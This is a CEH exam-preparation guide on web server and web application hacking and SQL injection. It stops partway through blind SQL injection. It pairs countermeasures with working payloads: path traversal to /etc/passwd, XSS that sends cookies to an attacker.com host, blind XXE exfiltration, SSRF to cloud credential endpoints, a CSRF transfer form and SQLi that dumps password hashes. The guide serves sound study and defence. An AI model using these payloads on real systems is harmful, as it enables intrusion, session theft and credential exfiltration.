# CEH Exam Preparation: Day 5 — Domain 5: Web Application Hacking (14% of Exam)

> Solving exercises will teach you more than you can think. Most of our knowledge comes from doing — and while doing you must solve problems, search for clues, and try different things; in this way you will learn rapidly.

This is Day 5 of your 7-day CEH preparation. Today covers **Domain 5: Web Application Hacking**, which accounts for approximately **14% of the CEH exam**. This is one of the highest-weighted domains. You will study **Hacking Web Servers**, **Hacking Web Applications** (including OWASP Top 10), and **SQL Injection** in depth.

---

## Recommended Schedule for Today (6-7 hours)

| Block | Duration | Activity |
|-------|----------|----------|
| Block 1 | 1.5 h | Study Hacking Web Servers — server types, attack vectors, tools |
| Block 2 | 2.5 h | Study Hacking Web Applications — OWASP Top 10, XSS, CSRF, SSRF, web API attacks |
| Block 3 | 2 h | Study SQL Injection — types, payloads, sqlmap, evasion, defenses |
| Block 4 | 0.5 h | Review tables, practice exam-style questions |

---

# Part 1: Hacking Web Servers

## 1.1 Web Server Concepts

A web server is software that accepts HTTP/HTTPS requests and serves web content (HTML, CSS, JavaScript, images, API responses). Understanding the most common web servers is essential for the CEH exam.

### Major Web Servers

| Web Server | Key Characteristics | Default Port | Config File |
|------------|-------------------|--------------|-------------|
| **Apache HTTP Server** | Open-source, most widely used, modular architecture, supports .htaccess for per-directory config | 80 (HTTP), 443 (HTTPS) | httpd.conf or apache2.conf |
| **Microsoft IIS** (Internet Information Services) | Windows-only, integrated with Windows Server, supports ASP.NET, uses applicationHost.config | 80/443 | applicationHost.config, web.config |
| **Nginx** | Open-source, high performance, reverse proxy, load balancer, event-driven architecture (handles many concurrent connections efficiently) | 80/443 | nginx.conf |
| **Apache Tomcat** | Java servlet container, runs Java web applications (WAR files), not a full web server but often used as one | 8080 (default HTTP) | server.xml, web.xml |
| **Node.js** | JavaScript runtime, event-driven, non-blocking I/O, commonly used for REST APIs | 3000 (common default) | package.json (app-specific) |

### Web Server Architecture

```
Client (Browser)
    |
    | HTTP/HTTPS Request
    v
[Web Server] (Apache/IIS/Nginx)
    |
    |--- Static content --> File System (HTML, CSS, JS, images)
    |
    |--- Dynamic content --> Application Server (PHP, ASP.NET, Python, Java)
    |                              |
    |                              v
    |                        [Database Server] (MySQL, MSSQL, PostgreSQL)
    |
    v
HTTP/HTTPS Response --> Client
```

## 1.2 Web Server Attacks

### Directory Traversal (Path Traversal)

Directory traversal exploits insufficient input validation to access files outside the web root directory.

**Attack:**
```
Normal request:
GET /page.php?file=report.pdf HTTP/1.1

Directory traversal:
GET /page.php?file=../../../etc/passwd HTTP/1.1
GET /page.php?file=..\..\..\..\windows\system32\config\sam HTTP/1.1
```

**Variations to bypass filters:**
```
# URL encoding
GET /page.php?file=..%2f..%2f..%2fetc%2fpasswd

# Double URL encoding
GET /page.php?file=..%252f..%252f..%252fetc%252fpasswd

# Unicode encoding (IIS-specific)
GET /page.php?file=..%c0%af..%c0%af..%c0%afetc/passwd

# Null byte injection (older PHP versions)
GET /page.php?file=../../../etc/passwd%00.jpg

# Using absolute path
GET /page.php?file=/etc/passwd
```

### HTTP Response Splitting

HTTP response splitting injects CRLF (Carriage Return Line Feed: \r\n) characters into HTTP headers, allowing the attacker to split a single HTTP response into two separate responses.

**Attack:**
```
Normal request:
GET /redirect?url=http://example.com HTTP/1.1

Injected request:
GET /redirect?url=http://example.com%0d%0a%0d%0aInjectedContent HTTP/1.1
```

The %0d%0a is the URL-encoded CRLF. By injecting two CRLFs, the attacker terminates the first response and begins a second one with attacker-controlled content. This can lead to:
- Web cache poisoning (the cache stores the attacker's response for that URL)
- XSS (if the injected content contains JavaScript)
- Session fixation (if the injected response sets cookies)

### Web Cache Poisoning

Web cache poisoning manipulates the caching mechanism to serve malicious content to users.

**How it works:**
```
1. Attacker sends a crafted request that causes the web server
   to generate a malicious response
2. The caching server (CDN, reverse proxy, or browser cache)
   stores this malicious response
3. When other users request the same URL, they receive
   the cached malicious response
4. The attack persists until the cache entry expires
```

**Methods:**
- HTTP response splitting (inject malicious response)
- Unkeyed header manipulation (the cache does not include certain headers in the cache key, but the server uses them to generate content)
- Host header attacks (inject a malicious Host header that the server uses in URLs)

### DNS Hijacking

DNS hijacking redirects DNS queries to a malicious DNS server, causing the victim to reach attacker-controlled servers.

**Types:**
| Type | Description |
|------|-------------|
| Local DNS hijacking | Malware modifies the victim's local DNS settings (e.g., /etc/resolv.conf or Windows DNS settings) |
| Router DNS hijacking | Attacker compromises the router and changes its DNS settings; all clients using the router are affected |
| Rogue DNS server | Attacker sets up a malicious DNS server and redirects traffic through ARP spoofing or DHCP attacks |
| DNS cache poisoning | Attacker injects false DNS records into a DNS resolver's cache (Kaminsky attack) |

### Website Defacement

Website defacement replaces the content of a website with the attacker's own content (usually a message or image). It is a visible sign of compromise.

**How it happens:**
- Exploiting web application vulnerabilities (SQL injection, file upload, RCE)
- Compromising FTP/SSH credentials
- Exploiting CMS vulnerabilities (WordPress, Joomla, Drupal)
- Exploiting server misconfigurations

### Server Misconfiguration

Common misconfigurations that attackers exploit:

| Misconfiguration | Risk |
|-----------------|------|
| Default credentials | Admin panels accessible with admin/admin, admin/password, etc. |
| Directory listing enabled | Visitors can browse all files in a directory |
| Verbose error messages | Stack traces, database errors, and path information leaked to the client |
| Unnecessary services running | Larger attack surface |
| Default pages/samples not removed | IIS sample pages, Tomcat manager, phpinfo() files expose information |
| Weak TLS configuration | Supports deprecated protocols (SSLv3, TLS 1.0) or weak cipher suites |
| Missing security headers | No X-Frame-Options, X-Content-Type-Options, Content-Security-Policy headers |
| Backup files accessible | .bak, .old, .swp files in the web root contain source code or credentials |

### Patch Management

Patch management is the process of keeping software up to date by applying security patches. Failure to patch is one of the most common reasons web servers are compromised.

**Key CEH exam points:**
- Patch management should be part of a formal change management process
- Test patches in a staging environment before deploying to production
- Prioritize patches based on severity (CVSS score)
- Automate patch deployment where possible
- Monitor vendor security advisories

## 1.3 Web Server Footprinting and Reconnaissance

### Banner Grabbing

Banner grabbing retrieves the server's response headers to identify the web server software and version.

**Using netcat:**
```bash
# Connect to the web server and send an HTTP request
nc -v target.com 80
HEAD / HTTP/1.1
Host: target.com

# Response reveals server type and version:
# HTTP/1.1 200 OK
# Server: Apache/2.4.41 (Ubuntu)
# X-Powered-By: PHP/7.4.3
```

**Using wget:**
```bash
# Save response headers only
wget --server-response --spider http://target.com 2>&1 | head -20

# Output includes:
#   Server: nginx/1.18.0
#   X-Powered-By: Express
```

**Using Nmap:**
```bash
# HTTP service detection
nmap -sV -p 80,443 target.com

# HTTP banner grabbing script
nmap --script http-headers -p 80,443 target.com

# Detailed HTTP enumeration
nmap --script http-enum -p 80 target.com

# Detect web server and version
nmap --script http-server-header -p 80,443 target.com
```

**Using curl:**
```bash
# Retrieve response headers only
curl -I http://target.com

# Include response headers with the body
curl -v http://target.com 2>&1 | head -30
```

### robots.txt Information Leakage

The robots.txt file tells search engine crawlers which directories to avoid. Attackers use it to discover hidden or sensitive directories.

```
# Example robots.txt revealing sensitive paths:
User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /config/
Disallow: /database/
Disallow: /logs/
Disallow: /api/internal/
Disallow: /wp-admin/
Disallow: /phpmyadmin/
```

Each Disallow entry is a directory the site owner does not want indexed — which often means it contains sensitive content. Attackers use this as a roadmap.

```bash
# Retrieve robots.txt
curl http://target.com/robots.txt

# Nmap script to retrieve robots.txt
nmap --script http-robots.txt -p 80 target.com
```

> **Exam tip:** robots.txt is a **suggestion** to crawlers, not a security mechanism. Search engines can choose to ignore it. It should never be used to hide sensitive content — use authentication and access controls instead.

### Web Server Footprinting Methodology

```
1. Banner grabbing (netcat, wget, curl, Nmap)
   -> Identify server software and version

2. Check robots.txt and sitemap.xml
   -> Discover hidden directories and structure

3. HTTP methods testing
   -> Check for dangerous methods: PUT, DELETE, TRACE, CONNECT
   -> curl -X OPTIONS http://target.com -i

4. Directory brute-forcing
   -> Gobuster, DirBuster, dirsearch
   -> Discover hidden directories and files

5. Vulnerability scanning
   -> Nikto, Nessus, OpenVAS
   -> Identify known vulnerabilities

6. Check for common files
   -> /.git/, /.svn/, /web.config, /WEB-INF/web.xml
   -> .env, config.php, wp-config.php
```

## 1.4 Nikto Scanner

**Nikto** is an open-source web server scanner that checks for dangerous files, outdated server software, version-specific vulnerabilities, and server configuration issues.

```bash
# Basic scan
nikto -h http://target.com

# Scan specific port
nikto -h http://target.com -p 8080

# Scan with SSL
nikto -h https://target.com -ssl

# Scan and save output
nikto -h http://target.com -o report.html -Format htm

# Scan with specific tuning (test types)
nikto -h http://target.com -Tuning 123

# Use a specific proxy
nikto -h http://target.com -useproxy http://proxy:8080
```

**Nikto tuning options:**

| Tuning | Test Type |
|--------|-----------|
| 1 | Interesting File / Seen in logs |
| 2 | Misconfiguration / Default File |
| 3 | Information Disclosure |
| 4 | Injection (XSS/Script/HTML) |
| 5 | Remote File Retrieval - Inside Web Root |
| 6 | Denial of Service |
| 7 | Remote File Retrieval - Server Wide |
| 8 | Command Execution / Remote Shell |
| 9 | SQL Injection |
| 0 | File Upload |

**What Nikto checks:**
- Over 6,700 potentially dangerous files/programs
- Over 1,250 outdated server versions
- Server configuration items (directory indexing, HTTP methods, security headers)
- Installed web servers and software (CMS detection)
- Default credentials for common admin panels

---

# Part 2: Hacking Web Applications

## 2.1 Web Application Architecture

### N-Tier Architecture

Modern web applications use a multi-tier (N-tier) architecture that separates concerns:

```
Tier 1: Presentation Tier (Client)
    Browser, mobile app, API consumer
    HTML/CSS/JavaScript
    |
    | HTTP/HTTPS
    v
Tier 2: Logic Tier (Application Server)
    Business logic, authentication, authorization
    PHP, ASP.NET, Java, Python, Node.js
    |
    | SQL queries, ORM
    v
Tier 3: Data Tier (Database Server)
    Data storage and retrieval
    MySQL, PostgreSQL, MSSQL, MongoDB, Oracle
```

**Security implications of N-tier:**
- Each tier can be attacked independently
- The application tier must validate ALL input (never trust the client)
- The database tier must use parameterized queries
- Communication between tiers should be encrypted
- Each tier should run with minimum required privileges

## 2.2 OWASP Top 10 (2021)

The OWASP Top 10 is a standard awareness document for web application security. The CEH exam heavily tests these categories.

| Rank | Category | Description |
|------|----------|-------------|
| A01 | **Broken Access Control** | Users can act outside their intended permissions. IDOR, privilege escalation, accessing other users' data. |
| A02 | **Cryptographic Failures** | Failure to properly protect data in transit and at rest. Weak encryption, plaintext passwords, missing HTTPS. (Previously "Sensitive Data Exposure") |
| A03 | **Injection** | SQL injection, NoSQL injection, OS command injection, LDAP injection. Untrusted data sent to an interpreter. |
| A04 | **Insecure Design** | Flaws in the design and architecture of the application (not implementation bugs). Missing threat modeling, insecure design patterns. |
| A05 | **Security Misconfiguration** | Default credentials, unnecessary features enabled, missing security headers, verbose error messages, unpatched software. |
| A06 | **Vulnerable and Outdated Components** | Using libraries, frameworks, or software with known vulnerabilities. No patch management. |
| A07 | **Identification and Authentication Failures** | Weak passwords, credential stuffing, missing MFA, improper session management. (Previously "Broken Authentication") |
| A08 | **Software and Data Integrity Failures** | Code and infrastructure that does not protect against integrity violations. Insecure CI/CD pipelines, auto-update without verification, insecure deserialization. |
| A09 | **Security Logging and Monitoring Failures** | Insufficient logging, missing alerting, inability to detect breaches. (Previously "Insufficient Logging and Monitoring") |
| A10 | **Server-Side Request Forgery (SSRF)** | The server makes requests to attacker-specified URLs, potentially accessing internal services. New in 2021 Top 10. |

## 2.3 Cross-Site Scripting (XSS)

XSS injects malicious JavaScript into web pages viewed by other users. The victim's browser executes the attacker's script because it trusts the origin (the vulnerable website).

### XSS Types

| Type | How It Works | Persistence | Delivery |
|------|-------------|-------------|----------|
| **Stored (Persistent) XSS** | Malicious script is stored on the server (database, forum post, comment) and served to every user who views the page | Permanent until removed | Victim visits the page; no special link needed |
| **Reflected (Non-Persistent) XSS** | Malicious script is part of the URL/request; the server reflects it back in the response without storing it | Not stored; one-time | Victim must click a crafted link |
| **DOM-based XSS** | The vulnerability is in client-side JavaScript that processes user input and writes it to the DOM without sanitization | Not stored; client-side only | Victim must visit a page with malicious fragment/parameter |

### XSS Payload Examples

**Basic alert (proof of concept):**
```html
<script>alert('XSS')</script>
```

**Cookie theft (Stored or Reflected XSS):**
```html
<script>
var img = new Image();
img.src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>
```

**Event handler payloads (bypass script tag filters):**
```html
<img src=x onerror="alert('XSS')">
<body onload="alert('XSS')">
<svg onload="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>
<details open ontoggle="alert('XSS')">
```

**DOM-based XSS example:**

Vulnerable JavaScript code reads from URL fragment and writes to page:
```javascript
// The code reads user input from the URL and writes it to the page unsafely
var name = document.location.hash.substring(1);
document.getElementById("greeting").textContent = "Hello, " + name;
// NOTE: Using textContent is safe; the vulnerability occurs when code uses
// unsafe DOM manipulation methods that interpret strings as HTML
```

When the code uses unsafe DOM writing methods instead of textContent, an attacker can craft a URL like:
```
http://target.com/page.html#<img src=x onerror=alert('XSS')>
```
The browser interprets the injected markup as HTML, executing the attacker's script.

**Session hijacking via XSS:**
```html
<script>
fetch('https://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify({cookie: document.cookie, url: window.location.href}),
    headers: {'Content-Type': 'application/json'}
});
</script>
```

### XSS Countermeasures

| Countermeasure | Description |
|----------------|-------------|
| Input validation | Validate and sanitize all user input (whitelist approach) |
| Output encoding | Encode output before rendering in HTML (convert < to &amp;lt; etc.) |
| Content Security Policy (CSP) | HTTP header that restricts which scripts can run; blocks inline scripts |
| HttpOnly cookie flag | Prevents JavaScript from accessing session cookies |
| WAF (Web Application Firewall) | Filters known XSS patterns in HTTP requests |
| Use frameworks with auto-escaping | React, Angular, Vue.js automatically escape output by default |

## 2.4 Cross-Site Request Forgery (CSRF)

CSRF tricks a victim's browser into making an unwanted request to a site where the victim is authenticated. The browser automatically includes session cookies, so the request appears legitimate.

**Attack scenario:**
```
1. Victim is logged into bank.com
2. Victim visits attacker.com (or opens a malicious email)
3. Attacker's page contains a hidden form:

<form action="https://bank.com/transfer" method="POST" id="csrf-form">
    <input type="hidden" name="to" value="attacker_account" />
    <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById('csrf-form').submit();</script>

4. Victim's browser sends the request to bank.com WITH the victim's
   session cookie (automatic browser behavior)
5. Bank.com processes the transfer because the request has a valid session
```

**CSRF Countermeasures:**

| Countermeasure | How It Works |
|----------------|-------------|
| Anti-CSRF tokens | Server generates a random token per session/form; the token must be included in the request. Attacker cannot read the token from another origin (same-origin policy). |
| SameSite cookie attribute | Cookies are not sent with cross-site requests. Strict = never; Lax = only for top-level GET navigations |
| Referer/Origin header validation | Server checks that the request originated from the same site |
| Re-authentication for sensitive actions | Require the user to enter their password before critical operations (e.g., changing email, transferring funds) |
| Custom request headers | API requests include a custom header (e.g., X-Requested-With); simple forms cannot set custom headers |

> **Exam tip:** The key difference between XSS and CSRF: **XSS exploits the user's trust in a website** (the website serves malicious content). **CSRF exploits the website's trust in the user's browser** (the website trusts requests that come with valid cookies).

## 2.5 Server-Side Request Forgery (SSRF)

SSRF occurs when an attacker can make the **server** send requests to unintended destinations — typically internal services that are not directly accessible from the internet.

**Attack scenario:**
```
Normal functionality: The application fetches a URL provided by the user
(e.g., "Enter a URL to generate a preview")

POST /fetch-url HTTP/1.1
Content-Type: application/json

{"url": "http://example.com/image.jpg"}

SSRF attack: The attacker provides an internal URL

{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

**Common SSRF targets:**

| Target | URL | What It Returns |
|--------|-----|-----------------|
| AWS metadata service | http://169.254.169.254/latest/meta-data/ | Instance metadata, IAM role credentials, account ID |
| Internal services | http://localhost:8080/admin | Admin panels not exposed to the internet |
| Internal APIs | http://internal-api.corp:3000/users | Internal data |
| Cloud metadata (GCP) | http://metadata.google.internal/computeMetadata/v1/ | GCP instance metadata |
| Cloud metadata (Azure) | http://169.254.169.254/metadata/instance | Azure instance metadata |
| File access | file:///etc/passwd | Local files on the server |

**SSRF bypass techniques:**
```
# Bypass URL filters using alternate IP representations
http://127.0.0.1        -> http://0177.0.0.1 (octal)
http://127.0.0.1        -> http://2130706433 (decimal)
http://127.0.0.1        -> http://0x7f000001 (hex)
http://localhost         -> http://127.1

# DNS rebinding
# Register a domain that resolves to 127.0.0.1
http://attacker-domain.com -> resolves to 127.0.0.1

# URL redirects
http://attacker.com/redirect -> 302 redirect to http://169.254.169.254/
```

**SSRF Countermeasures:**
- Whitelist allowed URLs, domains, or IP ranges
- Block requests to internal/private IP ranges (10.x.x.x, 172.16-31.x.x, 192.168.x.x, 127.x.x.x, 169.254.x.x)
- Disable unnecessary URL schemes (file://, gopher://, dict://)
- Use a dedicated service account with minimal network access for URL fetching
- Validate and sanitize user-supplied URLs

## 2.6 Clickjacking

Clickjacking (UI redressing) tricks users into clicking on something different from what they perceive by overlaying transparent iframes on legitimate-looking pages.

**Attack:**
```html
<!-- Attacker's page -->
<style>
    iframe {
        position: absolute;
        top: 0; left: 0;
        width: 100%; height: 100%;
        opacity: 0;       /* invisible */
        z-index: 2;        /* on top */
    }
    .decoy {
        position: absolute;
        z-index: 1;        /* behind the invisible iframe */
    }
</style>

<div class="decoy">
    <h1>Click here to win a prize!</h1>
    <button>CLAIM PRIZE</button>
</div>

<!-- Invisible iframe loading the target site -->
<iframe src="https://bank.com/transfer?to=attacker&amount=1000"></iframe>
```

The user sees "CLAIM PRIZE" but actually clicks a button in the invisible iframe on bank.com.

**Countermeasures:**
- X-Frame-Options: DENY (prevents the page from being loaded in any iframe)
- X-Frame-Options: SAMEORIGIN (allows iframes only from the same origin)
- Content-Security-Policy: frame-ancestors 'self' (modern replacement for X-Frame-Options)
- Frame-busting JavaScript (less reliable; can be bypassed)

## 2.7 Insecure Direct Object Reference (IDOR)

IDOR occurs when an application exposes internal implementation objects (database IDs, file names) and does not verify that the user is authorized to access them.

**Example:**
```
# User views their own profile
GET /api/users/1234/profile HTTP/1.1
Cookie: session=valid_session_for_user_1234

# Attacker changes the ID to view another user's profile
GET /api/users/1235/profile HTTP/1.1
Cookie: session=valid_session_for_user_1234

# If the server does not check that user 1234 is authorized
# to view user 1235's data, this is an IDOR vulnerability
```

**Other IDOR examples:**
```
# File download
/download?file=report_1234.pdf  -> change to report_1235.pdf

# Invoice access
/invoice?id=5001  -> change to id=5002

# API endpoint
DELETE /api/posts/42  -> deleting another user's post
```

**Countermeasures:**
- Implement proper authorization checks on every request
- Use indirect references (map user-facing IDs to internal IDs using session-specific mappings)
- Use UUIDs instead of sequential integer IDs (harder to guess, but does not replace authorization checks)

## 2.8 Parameter Tampering and Cookie Tampering

### Parameter Tampering

Parameter tampering modifies URL parameters, form fields, or hidden fields to alter application behavior.

**Examples:**
```
# Price manipulation
POST /checkout HTTP/1.1
item=laptop&quantity=1&price=999.99
-> Change to: price=0.01

# Role escalation via hidden field
POST /register HTTP/1.1
username=attacker&password=pass123&role=user
-> Change to: role=admin

# Access control bypass
GET /admin/panel?authorized=false
-> Change to: authorized=true
```

### Cookie Tampering

Cookie tampering modifies cookie values to alter session state or bypass authentication.

**Examples:**
```
# Role stored in cookie
Cookie: session=abc123; role=user
-> Change to: role=admin

# Discount flag in cookie
Cookie: session=abc123; discount=0
-> Change to: discount=50

# Base64-encoded cookie
Cookie: userData=dXNlcm5hbWU9am9objtpc0FkbWluPWZhbHNl
# Decoded: username=john;isAdmin=false
# Modified: username=john;isAdmin=true
# Re-encoded: dXNlcm5hbWU9am9objtpc0FkbWluPXRydWU=
Cookie: userData=dXNlcm5hbWU9am9objtpc0FkbWluPXRydWU=
```

**Countermeasures:**
- Never trust client-side data (validate on the server)
- Sign cookies with HMAC to detect tampering
- Store sensitive state on the server, not in cookies or hidden fields
- Use server-side session management

## 2.9 Broken Authentication

Broken authentication covers weaknesses in the authentication mechanism that allow attackers to compromise user accounts.

| Vulnerability | Description | Example |
|--------------|-------------|---------|
| Credential stuffing | Using leaked username/password pairs from other breaches | Using lists from previous data breaches against the target site |
| Brute force | Systematically trying all possible passwords | Hydra, Burp Intruder, Medusa |
| Default credentials | Using factory-default usernames and passwords | admin/admin, admin/password |
| Weak password policy | Allowing short or simple passwords | Minimum 4 characters, no complexity requirements |
| Missing account lockout | No lockout after failed login attempts | Unlimited password guessing |
| Session ID in URL | Session ID exposed in URL (visible in browser history, referrer headers, logs) | http://site.com/page?sessionid=abc123 |
| Missing MFA | No multi-factor authentication for critical accounts | Single password for admin accounts |
| Insecure password storage | Passwords stored in plaintext or with weak hashing (MD5, SHA1 without salt) | Database breach exposes all passwords |

**Countermeasures:**
- Implement MFA (Multi-Factor Authentication)
- Use strong password policies
- Implement account lockout after N failed attempts
- Use secure password hashing (bcrypt, scrypt, Argon2 with salt)
- Never expose session IDs in URLs
- Rate-limit login attempts

## 2.10 Security Misconfiguration

Security misconfiguration is the most commonly seen vulnerability. It applies at every level: OS, web server, application framework, database, and custom code.

**Common misconfigurations:**

```
# Directory listing enabled (Apache)
# In httpd.conf:
Options Indexes FollowSymLinks    # BAD - Indexes enables directory listing
Options FollowSymLinks            # GOOD - removed Indexes

# Default error pages reveal stack traces
# User sees: "java.sql.SQLException: Unknown column 'x' in
# 'where clause' at com.mysql.jdbc.SQLError.createSQLException..."

# Unnecessary HTTP methods enabled
curl -X OPTIONS http://target.com -i
# Allow: GET, HEAD, POST, PUT, DELETE, TRACE, OPTIONS
# PUT and DELETE should not be enabled unless needed
# TRACE can enable XST (Cross-Site Tracing) attacks

# Debug mode enabled in production
# Django: DEBUG = True in settings.py
# Flask: app.run(debug=True)
# Exposes source code, environment variables, and database queries

# Missing security headers
# No Content-Security-Policy
# No X-Frame-Options
# No X-Content-Type-Options
# No Strict-Transport-Security (HSTS)
```

## 2.11 Web API Attacks

Modern web applications heavily rely on APIs. The CEH exam tests API security concepts.

### REST API

**REST** (Representational State Transfer) uses standard HTTP methods:

| HTTP Method | CRUD Operation | Example |
|-------------|---------------|---------|
| GET | Read | GET /api/users/123 |
| POST | Create | POST /api/users |
| PUT | Update (full) | PUT /api/users/123 |
| PATCH | Update (partial) | PATCH /api/users/123 |
| DELETE | Delete | DELETE /api/users/123 |

**REST API attacks:**

| Attack | Description |
|--------|-------------|
| Broken Object-Level Authorization (BOLA) | Same as IDOR — access another user's resources by changing the ID |
| Mass assignment | Sending extra fields in the request body that the server accepts (e.g., adding "role":"admin") |
| Rate limiting bypass | Sending excessive requests to abuse API functionality |
| API key exposure | API keys in client-side code, public repositories, or URL parameters |
| Lack of input validation | SQL injection, command injection through API parameters |
| Excessive data exposure | API returns more data than the client needs (e.g., full user records instead of just names) |

### SOAP API

**SOAP** (Simple Object Access Protocol) uses XML messages and WSDL (Web Services Description Language) to define the interface.

```xml
<!-- SOAP Request -->
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <GetUser xmlns="http://example.com/">
            <userId>123</userId>
        </GetUser>
    </soap:Body>
</soap:Envelope>
```

**SOAP-specific attacks:**
- XML injection
- XXE (XML External Entity) injection
- WSDL scanning (WSDL file exposes all available operations)
- SOAPAction spoofing (changing the SOAPAction header to invoke unintended operations)

### Webhooks

**Webhooks** are HTTP callbacks — the server sends an HTTP POST to a URL you specify when an event occurs.

**Webhook attacks:**
- SSRF via webhook URL (set the webhook URL to an internal service)
- Webhook replay attacks (replay a captured webhook payload)
- Missing webhook signature verification (attacker sends fake webhook events)

## 2.12 XML External Entity (XXE) Injection

XXE exploits XML parsers that process external entity references. The attacker defines an external entity in the XML input that references a local file or remote URL.

**Vulnerable XML parser receives:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
    <name>&xxe;</name>
</user>
```

The XML parser resolves &xxe; by reading /etc/passwd and including its contents in the response.

**XXE attack variations:**

```xml
<!-- Read local files -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- SSRF via XXE -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

<!-- Blind XXE (out-of-band data exfiltration) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;

<!-- Denial of Service - Billion Laughs Attack -->
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!-- Each level expands 10x; after several levels, memory is exhausted -->
```

**XXE Countermeasures:**
- Disable external entity processing in the XML parser
- Use JSON instead of XML where possible
- Validate and sanitize XML input
- Use less complex data formats (JSON does not support entities)
- Apply the principle of least privilege to the XML parser (limit file access, network access)

## 2.13 Web Application Security Tools

| Tool | Type | Key Features |
|------|------|-------------|
| **Burp Suite** | Intercepting proxy + scanner | Proxy, Scanner, Repeater, Intruder, Sequencer, Decoder, Comparer. Industry standard for web app testing. |
| **OWASP ZAP** (Zed Attack Proxy) | Intercepting proxy + scanner | Free, open-source alternative to Burp Suite. Automated scanner, spider, fuzzer, active/passive scanning. |
| **Gobuster** | Directory/file brute-forcer | Fast Go-based tool for discovering hidden directories and files. Supports dir, dns, vhost, and fuzz modes. |
| **Syhunt Hybrid** | Automated web vulnerability scanner | Commercial scanner that detects XSS, SQL injection, file inclusion, and other web vulnerabilities. Multi-phase scanning. |
| **Wapiti** | Web vulnerability scanner | Open-source black-box scanner. Tests for SQL injection, XSS, XXE, SSRF, file inclusion, command injection. |
| **DirBuster** | Directory brute-forcer | Java-based OWASP tool for finding hidden directories and files using wordlists. |
| **Nikto** | Web server scanner | Checks for dangerous files, outdated software, and misconfigurations. |
| **w3af** | Web Application Attack and Audit Framework | Open-source framework with plugins for vulnerability detection and exploitation. |
| **SQLMap** | SQL injection automation | Automated SQL injection detection and exploitation (detailed in Part 3). |

### Gobuster Commands

```bash
# Directory brute-force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# With file extensions
gobuster dir -u http://target.com -w /path/to/wordlist.txt -x php,html,txt,bak

# Virtual host discovery
gobuster vhost -u http://target.com -w /path/to/subdomains.txt

# DNS subdomain brute-force
gobuster dns -d target.com -w /path/to/subdomains.txt

# With specific status codes to show
gobuster dir -u http://target.com -w /path/to/wordlist.txt -s "200,204,301,302,307"

# Increase threads for faster scanning
gobuster dir -u http://target.com -w /path/to/wordlist.txt -t 50
```

---

# Part 3: SQL Injection (SQLi)

## 3.1 What Is SQL Injection?

SQL injection occurs when an attacker can insert or manipulate SQL queries through user input that is not properly sanitized. The attacker's input is interpreted as SQL code rather than data.

**Vulnerable code example (PHP):**
```php
// User enters: admin' OR '1'='1
$username = $_POST['username'];
$password = $_POST['password'];

// This query becomes:
// SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

Because '1'='1' is always true, the query returns all users, and the attacker is logged in as the first user (usually admin).

## 3.2 SQL Injection Types

### In-Band SQL Injection

In-band SQLi uses the **same communication channel** for the attack and data retrieval. The attacker sends the injection payload via HTTP and receives the results in the HTTP response.

#### Error-Based SQL Injection

The attacker triggers database errors that reveal information in the error messages.

```sql
-- Input: single quote character
-- Error: You have an error in your SQL syntax... near at line 1
-- This confirms SQL injection is possible

-- Extract database version via error
' AND 1=CONVERT(int, @@version)--
-- Error: Conversion failed when converting the nvarchar value
-- 'Microsoft SQL Server 2019...' to data type int.

-- Extract data via EXTRACTVALUE (MySQL)
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--
-- Error: XPATH syntax error: '~mydatabase~'
```

#### Union-Based SQL Injection

The attacker uses the UNION SELECT statement to append additional queries to the original and combine results.

**Step-by-step methodology:**

```sql
-- Step 1: Determine the number of columns in the original query
' ORDER BY 1--     (success)
' ORDER BY 2--     (success)
' ORDER BY 3--     (success)
' ORDER BY 4--     (error) -> original query has 3 columns

-- Step 2: Find which columns are displayed in the output
' UNION SELECT 1,2,3--
-- If column 2 is visible in the page, inject data there

-- Step 3: Extract database information
' UNION SELECT 1,database(),3--           -- Current database name
' UNION SELECT 1,@@version,3--            -- Database version
' UNION SELECT 1,user(),3--               -- Current user

-- Step 4: Extract table names
' UNION SELECT 1,GROUP_CONCAT(table_name),3
  FROM information_schema.tables WHERE table_schema=database()--

-- Step 5: Extract column names from a specific table
' UNION SELECT 1,GROUP_CONCAT(column_name),3
  FROM information_schema.columns WHERE table_name='users'--

-- Step 6: Extract data
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users--
-- Output: admin:hash123,john:hash456,...
```

### Blind SQL Injection

In blind SQLi, the application does **not** display database errors or query results. The attacker must infer information based on the application's behavior.

#### Boolean-Based Blind SQL Injection

The attacker sends payloads that result in TRUE or FALSE conditions and observes whether the page content changes.

```sql
-- Test if injectable
' AND 1=1--    (page loads normally = TRUE)
' AND 1=2--    (page loads differently or is empty = FALSE)

-- Extract database name character by character
' AND (SELECT SUBSTRING(database(),1,1))='a'--    (FALSE - page empty)
' AND (SELECT SUBSTRING(database(),1,1))='m'--    (TRUE - page normal)
' AND (SELECT SUBSTRING(database(),2,1))='y'--    (TRUE)
-- Database name starts with "my..."

-- Extract using ASCII comparison (more efficient - binary search)
' AND ASCII(SUBSTRING(database(),1,1)) > 96--     (TRUE)
' AND ASCII(SUBSTRING(database(),1,1)) > 109--    (FALSE)
' AND ASCII(SUBSTRING(database(),1,1)) > 103--    (TRUE)
' AND ASCII(SUBSTRING(database(),1,1)) = 109--    (TRUE -> ASCII 109 = 'm')

-- Extract table existence
' AND (SELECT COUNT(*) FROM information_schema.tables
